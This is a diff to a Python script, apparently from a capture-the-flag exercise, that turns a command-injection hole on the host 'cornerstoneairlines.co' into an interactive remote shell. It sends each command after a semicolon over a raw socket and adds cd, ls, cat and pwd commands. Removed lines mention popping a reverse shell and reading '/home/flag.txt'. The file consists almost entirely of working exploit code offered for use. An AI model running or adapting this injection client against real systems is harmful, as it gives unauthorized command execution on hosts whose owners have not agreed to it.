@@ -8,6 +8,7 @@
 """
 
 import socket
+from subprocess import call
 from cmd import Cmd
 
 host = "cornerstoneairlines.co" # IP address here
@@ -34,14 +35,18 @@ def execute_cmd(cmd):
     """
 
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
     s.connect((host, port))
-    s.recv(1024)
-    s.send((";" + cmd + "\n").encode())
-    print(s.recv(1024))
+    d = s.recv(4096).decode()
+    if d == "\n":
+        s.recv(1024)
+
+    s.send((';' + cmd + '\n').encode())
+    print(s.recv(1024).decode())
 
 
 class Shell(Cmd):
+
+    current_directory= "/"
 
     def do_quit(self, args):
         """
@@ -52,9 +57,9 @@ class Shell(Cmd):
 
     def do_shell(self, args):
         """
-        This command pops a reverse shell for cornerstoneairlines.co.
+        This command opens up a shell
         """
-        execute_cmd("cat /home/flag.txt")
+        prompt.prompt = self.current_directory + '$'
 
     def do_pull(self, args):
         """
@@ -63,9 +68,48 @@ class Shell(Cmd):
         Pull <remote_path> <local_path>
         """
 
+    def do_pwd(self, args):
+        """
+        This command displays the current path to the working directory.
+        """
+        execute_cmd('cd ' + self.current_directory + ' && pwd')
+
+    def do_ls(self, args):
+        """
+        This command displays the files within the current directory
+        -a  | Displays all hidden files in directory
+        -l  | Displays long format of files
+        """
+
+        execute_cmd('cd ' + self.current_directory + ' && ls ' + args)
+
+    def do_cd(self, args):
+        """
+        This command changes the working directory to the provided directory
+        :param args: The directory to become the new working directory.
+        """
+        self.current_directory = args
+        if args == "" or args == '~':
+            self.current_directory = '/'
+
+        execute_cmd('cd ' + args)
+        prompt.prompt = self.current_directory + '$'
+
+    def do_cat(self, args):
+        """
+        This command prints a text file to the shell
+        """
+        execute_cmd('cd ' + self.current_directory + ' && cat ' + args)
+
+    def do_clear(self, args):
+        """
+        This command clears the shell screen
+        """
+        call('clear')
+
 
 if __name__ == '__main__':
     prompt = Shell()
     prompt.prompt = '$'
-    prompt.cmdloop('Starting interactive shell')
+    prompt.cmdloop()
 
